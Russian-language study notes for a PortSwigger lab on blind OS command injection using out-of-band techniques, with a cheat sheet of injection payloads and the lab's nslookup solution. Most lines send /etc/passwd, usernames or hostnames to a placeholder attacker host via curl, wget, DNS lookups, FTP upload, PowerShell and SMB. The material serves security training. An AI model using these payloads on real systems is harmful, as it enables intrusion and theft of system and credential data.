осн теория [[0_OSi_иньекции_теория_уязвимостей]]


доп теория к лабе nslookup

#### Использование слепой инъекции команд ОС с использованием внеполосных (OAST) техник

# команды / методы       (не забывать кодировать пробелы и спецсимволы)

-----


### HTTP — CURL / WGET              (быстро, удобно, но часто блокируют)
```bash
линукс

||curl http://твой-сайт.oast.fun/$(whoami)||
||wget http://твой-сайт.oast.fun --post-file=/etc/passwd||
||curl -X POST -d @/etc/passwd http://твой-сайт.oast.fun||



винда

||certutil -urlcache -f http://твой-сайт.oast.fун file.txt||
||powershell Invoke-WebRequest -Uri http://твой-сайт.oast.fun -Method POST -Body (Get-Content /etc/passwd)||

```

### DNS — NSLOOKUP / DIG / HOST
```bash
линукс

||nslookup `whoami`.твой-сайт.oast.fun||
||dig `hostname -f`.твой-сайт.oast.fun||
||host `id | base64`.твой-сайт.oast.fun||


винда

||nslookup %username%.твой-сайт.oast.fun||

```


### ПЕРЕДАЧА ДАННЫХ В ИМЕНИ ХОСТА (только **символы DNS** (буквы, цифры, точка, дефис))

```bash
||nslookup $(cat /etc/passwd | head -1 | base64 | tr -d '\n').твой-сайт.oast.fun||

||nslookup $(whoami).$(hostname).твой-сайт.oast.fun||
```


### PING — ICMP (редко работает, но просто) в логах **IP-адрес сервера**.
```bash

||ping -c 1 твой-сайт.oast.fun||
||ping -n 1 твой-сайт.oast.fun||  # Windows

```

### FTP
```bash
||curl ftp://твой-сайт.oast.fun --upload-file /etc/passwd||


```

### SMB (Windows)
```bash
||net use \\твой-сайт.oast.fun\share||
```

--------

лаба
https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
# Blind OS command injection with out-of-band interaction
OAST

смысл лабы в том, что при вводе успешных шел команд сервер всегда выдает в ответе стандартный ответ и никак не реагирует ни на задержки, ни на каки-либо другие события, поэтому единственный способ понять, что получили доступ к шел - это вывести запрос на свой сервер!
в этой лабе еще и выводить сами ответы шел на свой сервер сразу перенаправлять.

решение   ==nslookup==
```bash
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

# НО
#### Примечание

Чтобы предотвратить использование платформы Академии 
для атак третьих сторон, наш межсетевой экран блокирует 
взаимодействие между лабораториями и произвольными 
внешними системами. Чтобы решить лабораторию, нужно 
использовать стандартный публичный сервер Burp Collaborator.

-----
